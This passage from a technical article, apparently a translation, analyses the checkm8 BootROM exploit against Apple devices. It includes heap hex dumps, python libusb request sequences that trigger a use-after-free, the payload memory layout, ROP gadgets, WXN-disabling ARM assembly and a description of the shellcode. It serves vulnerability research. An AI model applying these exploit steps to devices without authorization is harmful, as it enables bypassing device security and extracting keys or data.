00000090: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 000000A0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 000000B0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ chunk at 0x4900 // task stack 0x4080 non-free 0x400 0 00000000: 6B 61 74 73 6B 61 74 73 6B 61 74 73 6B 61 74 73 katskatskatskats 00000010: 6B 61 74 73 6B 61 74 73 6B 61 74 73 6B 61 74 73 katskatskatskats 00000020: 6B 61 74 73 6B 61 74 73 6B 61 74 73 6B 61 74 73 katskatskatskats 00000030: 6B 61 74 73 6B 61 74 73 6B 61 74 73 6B 61 74 73 katskatskatskats 00000040: 6B 61 74 73 6B 61 74 73 6B 61 74 73 6B 61 74 73 katskatskatskats 00000050: 6B 61 74 73 6B 61 74 73 6B 61 74 73 6B 61 74 73 katskatskatskats 00000060: 6B 61 74 73 6B 61 74 73 6B 61 74 73 6B 61 74 73 katskatskatskats 00000070: 6B 61 74 73 6B 61 74 73 6B 61 74 73 6B 61 74 73 katskatskatskats 00000080: 6B 61 74 73 6B 61 74 73 6B 61 74 73 6B 61 74 73 katskatskatskats 00000090: 6B 61 74 73 6B 61 74 73 6B 61 74 73 6B 61 74 73 katskatskatskats 000000A0: 6B 61 74 73 6B 61 74 73 6B 61 74 73 6B 61 74 73 katskatskatskats 000000B0: 6B 61 74 73 6B 61 74 73 6B 61 74 73 6B 61 74 73 katskatskatskats chunk at 0x8980 // io_buf 0x840 non-free 0x4080 0 00000000: 63 6D 65 6D 63 6D 65 6D 00 00 00 00 00 00 00 00 cmemcmem........ 00000010: 10 00 0B 80 01 00 00 00 00 00 1B 80 01 00 00 00 ................ 00000020: EF FF 00 00 00 00 00 00 10 08 0B 80 01 00 00 00 ................ 00000030: 4C CC 00 00 01 00 00 00 20 08 0B 80 01 00 00 00 L....... ....... 00000040: 4C CC 00 00 01 00 00 00 30 08 0B 80 01 00 00 00 L.......0....... 00000050: 4C CC 00 00 01 00 00 00 40 08 0B 80 01 00 00 00 L.......@....... 00000060: 4C CC 00 00 01 00 00 00 A0 08 0B 80 01 00 00 00 L............... 00000070: 00 06 0B 80 01 00 00 00 6C 04 00 00 01 00 00 00 ........l....... 00000080: 00 00 00 00 00 00 00 00 78 04 00 00 01 00 00 00 ........x....... 00000090: 00 00 00 00 00 00 00 00 B8 A4 00 00 01 00 00 00 ................ 000000A0: 00 00 0B 80 01 00 00 00 E4 03 00 00 01 00 00 00 ................ 000000B0: 00 00 00 00 00 00 00 00 34 04 00 00 01 00 00 00 ........4....... chunk at 0x91c0 // hs config 0x80 non-free 0x0 0 00000000: 09 02 19 00 01 01 05 80 FA 09 04 00 00 00 FE 01 ................ 00000010: 00 00 07 21 01 0A 00 00 08 00 00 00 00 00 00 00 ...!............ 00000020: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000030: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ chunk at 0x9240 // ls config 0x80 non-free 0x0 0 00000000: 09 02 19 00 01 01 05 80 FA 09 04 00 00 00 FE 01 ................ 00000010: 00 00 07 21 01 0A 00 00 08 00 00 00 00 00 00 00 ...!............ 00000020: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000030: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ chunk at 0x92c0 0x80 non-free 0x0 0 00000000: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000010: 01 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000020: 6C CC 00 00 01 00 00 00 00 08 0B 80 01 00 00 00 l............... 00000030: F0 F1 F2 F3 F4 F5 F6 F7 F8 F9 FA FB FC FD FE FF ................ chunk at 0x9340 0x80 non-free 0x80 0 00000000: 80 00 00 00 00 00 00 00 00 89 08 80 01 00 00 00 ................ 00000010: FF FF FF FF C0 00 00 00 00 00 00 00 00 00 00 00 ................ 00000020: 48 DE 00 00 01 00 00 00 C0 93 1B 80 01 00 00 00 H............... 00000030: F0 F1 F2 F3 F4 F5 F6 F7 F8 F9 FA FB FC FD FE FF ................ chunk at 0x93c0 0x80 non-free 0x80 0 00000000: 80 00 00 00 00 00 00 00 00 89 08 80 01 00 00 00 ................ 00000010: FF FF FF FF 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000020: 00 00 00 00 00 00 00 00 40 94 1B 80 01 00 00 00 ........@....... 00000030: F0 F1 F2 F3 F4 F5 F6 F7 F8 F9 FA FB FC FD FE FF ................ chunk at 0x9440 0x80 non-free 0x80 0 00000000: 80 00 00 00 00 00 00 00 00 89 08 80 01 00 00 00 ................ 00000010: FF FF FF FF 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000020: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000030: F0 F1 F2 F3 F4 F5 F6 F7 F8 F9 FA FB FC FD FE FF ................ chunk at 0x94c0 0x180 non-free 0x80 0 00000000: E4 03 43 00 50 00 49 00 44 00 3A 00 38 00 30 00 ..CPID:.8.0. 00000010: 31 00 30 00 20 00 43 00 50 00 52 00 56 00 3A 00 1.0. .CPRV:. 00000020: 31 00 31 00 20 00 43 00 50 00 46 00 4D 00 3A 00 1.1. .CPFM:. 00000030: 30 00 33 00 20 00 53 00 43 00 45 00 50 00 3A 00 0.3. .SCEP:. 00000040: 30 00 31 00 20 00 42 00 44 00 49 00 44 00 3A 00 0.1. .BDID:. 00000050: 30 00 43 00 20 00 45 00 43 00 49 00 44 00 3A 00 0.C. .ECID:. 00000060: 30 00 30 00 31 00 41 00 34 00 30 00 33 00 36 00 0.0.1.A.4.0.3.6. 00000070: 32 00 30 00 34 00 35 00 45 00 35 00 32 00 36 00 2.0.4.5.E.5.2.6. 00000080: 20 00 49 00 42 00 46 00 4C 00 3A 00 33 00 43 00 .IBFL:.3.C. 00000090: 20 00 53 00 52 00 54 00 47 00 3A 00 5B 00 69 00 .SRTG:.[.i. 000000A0: 42 00 6F 00 6F 00 74 00 2D 00 32 00 36 00 39 00 Boot-.2.6.9. 000000B0: 36 00 2E 00 30 00 2E 00 30 00 2E 00 31 00 2E 00 6...0...0...1... chunk at 0x9640 // zlps[1] 0x80 non-free 0x180 0 00000000: 80 00 00 00 00 00 00 00 00 89 08 80 01 00 00 00 ................ 00000010: FF FF FF FF 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000020: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000030: F0 F1 F2 F3 F4 F5 F6 F7 F8 F9 FA FB FC FD FE FF ................ chunk at 0x96c0 // descs[0], Nonce 0x140 non-free 0x80 0 00000000: EA 03 20 00 4E 00 4F 00 4E 00 43 00 3A 00 35 00 .. .NONC:.5. 00000010: 35 00 46 00 38 00 43 00 41 00 39 00 37 00 41 00 5.F.8.CA9.7.A. 00000020: 46 00 45 00 36 00 30 00 36 00 43 00 39 00 41 00 FE6.0.6.C.9.A. 00000030: 41 00 31 00 31 00 32 00 44 00 38 00 42 00 37 00 A.1.1.2.D.8.B.7. 00000040: 43 00 46 00 33 00 35 00 30 00 46 00 42 00 36 00 CF3.5.0.FB6. 00000050: 35 00 37 00 36 00 43 00 41 00 41 00 44 00 30 00 5.7.6.CAAD0. 00000060: 38 00 43 00 39 00 35 00 39 00 39 00 34 00 41 00 8.C.9.5.9.9.4.A. 00000070: 46 00 32 00 34 00 42 00 43 00 38 00 44 00 32 00 F.2.4.BC8.D.2. 00000080: 36 00 37 00 30 00 38 00 35 00 43 00 31 00 20 00 6.7.0.8.5.C.1. . 00000090: 53 00 4E 00 4F 00 4E 00 3A 00 42 00 42 00 41 00 SNON:.BBA 000000A0: 30 00 41 00 36 00 46 00 31 00 36 00 42 00 35 00 0.A.6.F.1.6.B.5. 000000B0: 31 00 37 00 45 00 31 00 44 00 33 00 39 00 32 00 1.7.E.1.D.3.9.2. chunk at 0x9800 // descs[1], Manufacturer 0x80 non-free 0x140 0 00000000: 16 03 41 00 70 00 70 00 6C 00 65 00 20 00 49 00 ..Apple .I. 00000010: 6E 00 63 00 2E 00 D6 D7 D8 D9 DA DB DC DD DE DF nc............ 00000020: E0 E1 E2 E3 E4 E5 E6 E7 E8 E9 EA EB EC ED EE EF ................ 00000030: F0 F1 F2 F3 F4 F5 F6 F7 F8 F9 FA FB FC FD FE FF ................ chunk at 0x9880 // descs[2], Product 0x80 non-free 0x80 0 00000000: 3E 03 41 00 70 00 70 00 6C 00 65 00 20 00 4D 00 &gt;.Apple .M. 00000010: 6F 00 62 00 69 00 6C 00 65 00 20 00 44 00 65 00 obile .De 00000020: 76 00 69 00 63 00 65 00 20 00 28 00 44 00 46 00 vice .(.DF 00000030: 55 00 20 00 4D 00 6F 00 64 00 65 00 29 00 FE FF U. .Mode)... chunk at 0x9900 // descs[3], Serial number 0x140 non-free 0x80 0 00000000: C6 03 43 00 50 00 49 00 44 00 3A 00 38 00 30 00 ..CPID:.8.0. 00000010: 31 00 30 00 20 00 43 00 50 00 52 00 56 00 3A 00 1.0. .CPRV:. 00000020: 31 00 31 00 20 00 43 00 50 00 46 00 4D 00 3A 00 1.1. .CPFM:. 00000030: 30 00 33 00 20 00 53 00 43 00 45 00 50 00 3A 00 0.3. .SCEP:. 00000040: 30 00 31 00 20 00 42 00 44 00 49 00 44 00 3A 00 0.1. .BDID:. 00000050: 30 00 43 00 20 00 45 00 43 00 49 00 44 00 3A 00 0.C. .ECID:. 00000060: 30 00 30 00 31 00 41 00 34 00 30 00 33 00 36 00 0.0.1.A.4.0.3.6. 00000070: 32 00 30 00 34 00 35 00 45 00 35 00 32 00 36 00 2.0.4.5.E.5.2.6. 00000080: 20 00 49 00 42 00 46 00 4C 00 3A 00 33 00 43 00 .IBFL:.3.C. 00000090: 20 00 53 00 52 00 54 00 47 00 3A 00 5B 00 69 00 .SRTG:.[.i. 000000A0: 42 00 6F 00 6F 00 74 00 2D 00 32 00 36 00 39 00 Boot-.2.6.9. 000000B0: 36 00 2E 00 30 00 2E 00 30 00 2E 00 31 00 2E 00 6...0...0...1... chunk at 0x9a40 // zlps[0] 0x80 non-free 0x140 0 00000000: 80 00 00 00 00 00 00 00 00 89 08 80 01 00 00 00 ................ 00000010: FF FF FF FF 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000020: 00 00 00 00 00 00 00 00 40 96 1B 80 01 00 00 00 ........@....... 00000030: F0 F1 F2 F3 F4 F5 F6 F7 F8 F9 FA FB FC FD FE FF ................ chunk at 0x9ac0 0x46540 free 0x80 0 00000000: 00 00 00 00 00 00 00 00 F8 8F 08 80 01 00 00 00 ................ 00000010: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000020: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000030: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000040: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000050: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000060: 00 00 00 00 00 00 00 00 01 00 00 00 00 00 00 00 ................ 00000070: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000080: 00 00 00 00 00 00 00 00 F8 8F 08 80 01 00 00 00 ................ 00000090: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 000000A0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 000000B0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................</code> </pre> </div></div><br><p> You can also achieve an interesting effect by overflowing the configuration descriptors <code>High Speed</code> and <code>Full Speed</code> that are located right after the <code>IO</code> buffer. One of the fields of a configuration descriptor is responsible for its overall length. By overflowing this field, we can read beyond the descriptor. You can try and do it yourself by modifying the exploit. </p><br><h2 id="2-allocation-and-freeing-of-the-io-buffer-without-clearing-the-global-state"> 2. Allocation and freeing of the IO buffer without clearing the global state </h2><br><pre> <code class="python hljs">device = dfu.acquire_device() device.serial_number libusb1_async_ctrl_transfer(device, <span class="hljs-number"><span class="hljs-number">0x21</span></span>, <span class="hljs-number"><span class="hljs-number">1</span></span>, <span class="hljs-number"><span class="hljs-number">0</span></span>, <span class="hljs-number"><span class="hljs-number">0</span></span>, <span class="hljs-string"><span class="hljs-string">'A'</span></span> * <span class="hljs-number"><span class="hljs-number">0x800</span></span>, <span class="hljs-number"><span class="hljs-number">0.0001</span></span>) libusb1_no_error_ctrl_transfer(device, <span class="hljs-number"><span class="hljs-number">0x21</span></span>, <span class="hljs-number"><span class="hljs-number">4</span></span>, <span class="hljs-number"><span class="hljs-number">0</span></span>, <span class="hljs-number"><span class="hljs-number">0</span></span>, <span class="hljs-number"><span class="hljs-number">0</span></span>, <span class="hljs-number"><span class="hljs-number">0</span></span>) dfu.release_device(device)</code> </pre> <br><p> At this stage, an incomplete <code>OUT</code> request for uploading the image is created. At the same time, a global state is initialized, and the address of the buffer in the heap is written to the <code>io_buffer</code> . Then, <code>DFU</code> is reset with a <code>DFU_CLR_STATUS</code> request, and a new iteration of <code>DFU</code> begins. </p><br><h2 id="3-overwriting-usb_device_io_request-in-the-heap-with-use-after-free"> 3. Overwriting <code>usb_device_io_request</code> in the heap with <code>use-after-free</code> </h2><br><pre> <code class="python hljs">device = dfu.acquire_device() device.serial_number stall(device) leak(device) leak(device) libusb1_no_error_ctrl_transfer(device, <span class="hljs-number"><span class="hljs-number">0</span></span>, <span class="hljs-number"><span class="hljs-number">9</span></span>, <span class="hljs-number"><span class="hljs-number">0</span></span>, <span class="hljs-number"><span class="hljs-number">0</span></span>, t8010_overwrite, <span class="hljs-number"><span class="hljs-number">50</span></span>)</code> </pre> <br><p> At this stage, a <code>usb_device_io_request</code> type object is allocated in the heap, and it is overflown with <code>t8010_overwrite</code> , whose content was defined at the first stage. </p><br><p> The values of <code>t8010_nop_gadget</code> and <code>0x1800B0800</code> should overflow the fields <code>callback</code> and <code>next</code> of the <code>usb_device_io_request</code> structure. </p><br><p> <code>t8010_nop_gadget</code> is shown below and conforms to its name, but besides function return, the previous <code>LR</code> register is restored, and because of that the call <code>free</code> is skipped after the <code>callback</code> function in <code>usb_core_complete_endpoint_io</code> . This is important, because we damage the heap's metadata due to overflow, which would affect the exploit in case of a freeing attempt. </p><br><pre> <code class="plaintext hljs">bootrom:000000010000CC6C LDP X29, X30, [SP,#0x10+var_s0] // restore fp, lr bootrom:000000010000CC70 LDP X20, X19, [SP+0x10+var_10],#0x20 bootrom:000000010000CC74 RET</code> </pre> <br><p> <code>next</code> points to <code>INSECURE_MEMORY + 0x800</code> . Later, <code>INSECURE_MEMORY</code> will store the exploit's payload, and at the offset of <code>0x800</code> in the payload, there is a <code>callback-chain</code> , which we'll discuss later on. </p><br><h2 id="4-placing-the-payload"> 4. Placing the payload </h2><br><pre> <code class="python hljs"><span class="hljs-keyword"><span class="hljs-keyword">for</span></span> i <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> range(<span class="hljs-number"><span class="hljs-number">0</span></span>, len(payload), <span class="hljs-number"><span class="hljs-number">0x800</span></span>): libusb1_no_error_ctrl_transfer(device, <span class="hljs-number"><span class="hljs-number">0x21</span></span>, <span class="hljs-number"><span class="hljs-number">1</span></span>, <span class="hljs-number"><span class="hljs-number">0</span></span>, <span class="hljs-number"><span class="hljs-number">0</span></span>, payload[i:i+<span class="hljs-number"><span class="hljs-number">0x800</span></span>], <span class="hljs-number"><span class="hljs-number">50</span></span>)</code> </pre> <br><p> At this stage, every following packet is put into the memory area allocated for the image. The payload looks like this: </p><br><pre> <code class="plaintext hljs">0x1800B0000: t8010_shellcode # initializing shell-code ... 0x1800B0180: t8010_handler # new usb request handler ... 0x1800B0400: 0x1000006a5 # fake translation table descriptor # corresponds to SecureROM (0x100000000 -&gt; 0x100000000) # matches the value in the original translation table ... 0x1800B0600: 0x60000180000625 # fake translation table descriptor # corresponds to SecureRAM (0x180000000 -&gt; 0x180000000) # matches the value in the original translation table 0x1800B0608: 0x1800006a5 # fake translation table descriptor # new value translates 0x182000000 into 0x180000000 # plus, in this descriptor,there are rights for code execution 0x1800B0610: disabe_wxn_arm64 # code for disabling WXN 0x1800B0800: usb_rop_callbacks # callback-chain</code> </pre> <br><h2 id="5-execution-of-callback-chain"> 5. Execution of <code>callback-chain</code> </h2><br><pre> <code class="python hljs">dfu.usb_reset(device) dfu.release_device(device)</code> </pre> <br><p> After <code>USB</code> reset, the loop of canceling incomplete <code>usb_device_io_request</code> in the queue by going through a linked list is started. In the previous stages, we replaced the rest of the queue, which allows us to control the <code>callback</code> chain. To build this chain, we use this gadget: </p><br><pre> <code class="plaintext hljs">bootrom:000000010000CC4C LDP X8, X10, [X0,#0x70] ; X0 - usb_device_io_request pointer; X8 = arg0, X10 = call address bootrom:000000010000CC50 LSL W2, W2, W9 bootrom:000000010000CC54 MOV X0, X8 ; arg0 bootrom:000000010000CC58 BLR X10 ; call bootrom:000000010000CC5C CMP W0, #0 bootrom:000000010000CC60 CSEL W0, W0, W19, LT bootrom:000000010000CC64 B loc_10000CC6C bootrom:000000010000CC68 ; --------------------------------------------------------------------------- bootrom:000000010000CC68 bootrom:000000010000CC68 loc_10000CC68 ; CODE XREF: sub_10000CC1C+18â†‘j bootrom:000000010000CC68 MOV W0, #0 bootrom:000000010000CC6C bootrom:000000010000CC6C loc_10000CC6C ; CODE XREF: sub_10000CC1C+48â†‘j bootrom:000000010000CC6C LDP X29, X30, [SP,#0x10+var_s0] bootrom:000000010000CC70 LDP X20, X19, [SP+0x10+var_10],#0x20 bootrom:000000010000CC74 RET</code> </pre> <br><p> As you can see, at the offset of <code>0x70</code> from the pointer to the structure, the call's address and its first argument are loaded. With this gadget, we can easily make any <code>f(x)</code> type calls for arbitrary <code>f</code> and <code>x</code> . </p><br><p> The entire call chain can be easily emulated with <code>Unicorn Engine</code> . We did it with our modified version of the plugin <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">uEmu</a> . </p><br><p><img src="https://habrastorage.org/webt/ri/b2/me/rib2mefgpchdxbiro3ukyyyjzt0.png"></p><br><p> The results of the entire chain for <code>iPhone 7</code> can be found below. </p><br><h4 id="51-dc_civac-0x1800b0600"> 5.1. <code>dc_civac 0x1800B0600</code> </h4><br><pre> <code class="plaintext hljs">000000010000046C: SYS #3, c7, c14, #1, X0 0000000100000470: RET</code> </pre> <br><p> Clearing and invalidating the processor's cache at a virtual address. This will make the processor address our payload later. </p><br><h4 id="52-dmb"> 5.2. <code>dmb</code> </h4><br><pre> <code class="plaintext hljs">0000000100000478: DMB SY 000000010000047C: RET</code> </pre> <br><p> A memory barrier that guarantees the completion of all operations with the memory done before this instruction. Instructions in high-performance processors can be executed in an order different from the programmed one for the purpose of optimization. </p><br><h4 id="53-enter_critical_section"> 5.3. <code>enter_critical_section()</code> </h4><br><p> Then, interrupts are masked for the atomic execution of further operations. </p><br><h4 id="54-write_ttbr00x1800b0000"> 5.4. <code>write_ttbr0(0x1800B0000)</code> </h4><br><pre> <code class="plaintext hljs">00000001000003E4: MSR #0, c2, c0, #0, X0; [&gt;] TTBR0_EL1 (Translation Table Base Register 0 (EL1)) 00000001000003E8: ISB 00000001000003EC: RET</code> </pre> <br><p> A new value of the table register <code>TTBR0_EL1</code> is set in <code>0x1800B0000</code> . It is the address of <code>INSECURE MEMORY</code> where the exploit's payload is stored. As was mentioned before, the translation descriptors are located at certain offsets in the payload: </p><br><pre> <code class="plaintext hljs">... 0x1800B0400: 0x1000006a5 0x100000000 -&gt; 0x100000000 (rx) ... 0x1800B0600: 0x60000180000625 0x180000000 -&gt; 0x180000000 (rw) 0x1800B0608: 0x1800006a5 0x182000000 -&gt; 0x180000000 (rx) ...</code> </pre> <br><h4 id="55-tlbi"> 5.5. <code>tlbi</code> </h4><br><pre> <code class="plaintext hljs">0000000100000434: DSB SY 0000000100000438: SYS #0, c8, c7, #0 000000010000043C: DSB SY 0000000100000440: ISB 0000000100000444: RET</code> </pre> <br><p> The translation table is invalidated in order to translate addresses according to our new translation table. </p><br><h4 id="56-0x1820b0610---disable_wxn_arm64">  5.6ã€‚ <code>0x1820B0610 - disable_wxn_arm64</code> </h4><br><pre> <code class="plaintext hljs">MOV X1, #0x180000000 ADD X2, X1, #0xA0000 ADD X1, X1, #0x625 STR X1, [X2,#0x600] DMB SY MOV X0, #0x100D MSR SCTLR_EL1, X0 DSB SY ISB RET</code> </pre> <br><p> <code>WXN</code> (Write permission implies Execute-never) is disabled to allow us execute code in <code>RW</code> memory. The execution of the <code>WXN</code> disabling code is possible due to the modified translation table. </p><br><h4 id="57-write_ttbr00x1800a0000"> 5.7. <code>write_ttbr0(0x1800A0000)</code> </h4><br><pre> <code class="plaintext hljs">00000001000003E4: MSR #0, c2, c0, #0, X0; [&gt;] TTBR0_EL1 (Translation Table Base Register 0 (EL1)) 00000001000003E8: ISB 00000001000003EC: RET</code> </pre> <br><p> The original value of the <code>TTBR0_EL1</code> translation register is restored. It is necessary for the correct operation of <code>BootROM</code> during the translation of virtual addresses because the data in <code>INSECURE_MEMORY</code> will be overwritten. </p><br><h4 id="58-tlbi"> 5.8. <code>tlbi</code> </h4><br><p> The translation table is reset again. </p><br><h4 id="59-exit_critical_section"> 5.9. <code>exit_critical_section()</code> </h4><br><p> Interrupt handling is back to normal. </p><br><h4 id="510-0x1800b0000"> 5.10. <code>0x1800B0000</code> </h4><br><p> Control is transferred to the initializing <code>shellcode</code> . </p><br><p> Thus, the main task of <code>callback-chain</code> is to disable <code>WXN</code> and transfer control to the <code>shellcode</code> in <code>RW</code> memory. </p><br><h2 id="6-execution-of-shellcode"> 6. Execution of <code>shellcode</code> </h2><br><p> The <code>shellcode</code> is in <code>src/checkm8_arm64.S</code> and does the following: </p><br><h4 id="61-overwriting-usb-configuration-descriptors"> 6.1. Overwriting <code>USB</code> configuration descriptors </h4><br><p> In the global memory, two pointers to configuration descriptors <code>usb_core_hs_configuration_descriptor</code> and <code>usb_core_fs_configuration_descriptor</code> located in the heap are stored. In the third stage, these descriptors were damaged. They are necessary for the correct interaction with a <code>USB</code> device, so the <code>shellcode</code> restores them. </p><br><h4 id="62-changing-usbserialnumber"> 6.2. Changing <code>USBSerialNumber</code> </h4><br><p> A new string descriptor with a serial number is created with a substring <code>" PWND:[checkm8]"</code> added to it. This will help us understand if the exploit was successful. </p><br><h4 id="63-overwriting-the-pointer-of-the-usb-request-handler"> 6.3. Overwriting the pointer of the <code>USB</code> request handler </h4><br><p> The original pointer to the handler of <code>USB</code> requests to the interface is overwritten by a pointer to a new handler, which will be placed in the memory at the next step. </p><br><h4 id="64-copying-usb-request-handler-into-trampoline-memory-area-0x1800afc00"> 6.4. Copying <code>USB</code> request handler into <code>TRAMPOLINE</code> memory area ( <code>0x1800AFC00</code> ) </h4><br><p> Upon receiving a <code>USB</code> request, the new handler checks the <code>wValue</code> of the request against <code>0xffff</code> and if they're not equal, it transfers control back to the original handler. If they are equal, various commands can be executed in the new handlers, like <code>memcpy</code> , <code>memset</code> , and <code>exec</code> (calling an arbitrary address with an arbitrary set of arguments). </p><br><p> Thus, the analysis of the exploit is complete. </p><br><h2 id="the-implementation-of-the-exploit-at-a-lower-level-of-working-with-usb"> The implementation of the exploit at a lower level of working with USB </h2><br><p> As a bonus and an example of the attack at lower levels, we published a <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">Proof-of-Concept</a> of the <code>checkm8</code> implementation on <code>Arduino</code> with <code>USB Host Shield</code> . The PoC works only for <code>iPhone 7</code> but can be easily ported to other devices. When an <code>iPhone 7</code> in <code>DFU</code> mode is connected to <code>USB Host Shield</code> , all the steps described in this article will be executed, and the device will enter <code>PWND:[checkm8]</code> mode. Then, it can be connected to a PC via <code>USB</code> to work with it using <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">ipwndfu</a> (to dump memory, use crypto keys, etc.). This method is more stable than using asynchronous requests with a minimal timeout because we work directly with the <code>USB</code> controller. We used the <a href="">USB_Host_Shield_2.0</a> library. It needs minor modifications; the patch file is also in the repository. </p><br><div style="text-align:center;"><img width="500" src="https://habrastorage.org/webt/7o/bx/ni/7obxni6ihhdg8tz0dljedtfmrwy.jpeg"></div><br><h2 id="in-place-of-a-conclusion"> In place of a conclusion </h2><br><p> Analyzing <code>checkm8</code> was very interesting. We hope that this article will be useful for the community and will motivate new research in this area. The vulnerability will continue to influence the jailbreak community. A jailbreak based on <code>checkm8</code> is already being developed â€” <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">checkra1n</a> , and since the vulnerability is unfixable, it will always work on vulnerable chips ( <code>A5</code> to <code>A11</code> ) regardless of the iOS version. Plus, there are many vulnerable devices, like <code>iWatch</code> , <code>Apple TV</code> , etc. We expect more interesting projects for Apple devices to come. </p><br><p> Besides jailbreak, this vulnerability will also influence the researchers of Apple devices. With <code>checkm8</code> , you can already boot <code>iOS</code> devices in verbose mode, dump <code>SecureROM</code> , or use the <code>GID</code> key to decrypt firmware images. Although, the most interesting application for this exploit would be entering debug mode on vulnerable devices with <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">a special JTAG/SWD cable</a> . Before that, it could only be done with special prototypes that are <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">extremely hard to get</a> or with the help of <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">special services</a> . Thus, with <code>checkm8</code> , <code>Apple</code> research becomes way easier and cheaper. </p><br><h2 id="references"> References </h2><br><ol><li> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">Jonathan Levin, *OS Internals: iBoot</a> </li><li> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">Apple, iOS Security Guide</a> </li><li> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">littlelailo, apollo.txt</a> </li><li> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">usb.org</a> </li><li> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">USB in a NutShell</a> </li><li> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">ipwndfu</a> </li><li> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">an ipwndfu fork from LinusHenze</a> </li></ol></div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/zh-CN472762/">https://habr.com/ru/post/zh-CN472762/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../zh-CN472750/index.html">å¥½å§ï¼Œæˆ‘çœŸçš„éœ€è¦Kuberneteså—ï¼Ÿ</a></li>
<li><a href="../zh-CN472752/index.html">CSEï¼šé€‚ç”¨äºvCloudä¸­ä»»ä½•äººçš„Kubernetes</a></li>
<li><a href="../zh-CN472754/index.html">ä¸€ä¸ªæœˆå†…æ€ä¹ˆè¯´è‹±è¯­ã€‚ 9ä¸ªç®€å•æœ‰æ•ˆçš„æ­¥éª¤</a></li>
<li><a href="../zh-CN472758/index.html">å»ºè®®ï¼štry-å†…ç½®é”™è¯¯æ£€æŸ¥åŠŸèƒ½</a></li>
<li><a href="../zh-CN472760/index.html">å°†è®¡ç®—æ—¶é—´ä»å‡ å¹´å‡å°‘åˆ°å‡ åˆ†é’Ÿã€‚ äº†è§£é‡å­æœºå™¨å­¦ä¹ </a></li>
<li><a href="../zh-CN472766/index.html">ä»py.testä¸­çš„æ–‡ä»¶è¿›è¡Œå‚æ•°åŒ–</a></li>
<li><a href="../zh-CN472768/index.html">å¦‚ä½•è˜ç”¨ï¼Œè§£é›‡ç®¡ç†äººå‘˜å¹¶ä»ç®¡ç†äººå‘˜è¿”å›å¼€å‘äººå‘˜ï¼šBadoo Techleads Meetupï¼ƒ5çš„è§†é¢‘</a></li>
<li><a href="../zh-CN472770/index.html">ä½¿ç”¨UI Canvasè¿›è¡ŒUnityä¸­çš„ç•Œé¢ç»„ç»‡</a></li>
<li><a href="../zh-CN472772/index.html">æœç´¢ç±»ä¼¼çš„äº‹ä»¶å’Œç´¢èµ”ã€‚ æŒ‡æ ‡å’Œä¼˜åŒ–</a></li>
<li><a href="../zh-CN472776/index.html">å¤‡ä»½ç¬¬7éƒ¨åˆ†ï¼šç»“è®º</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
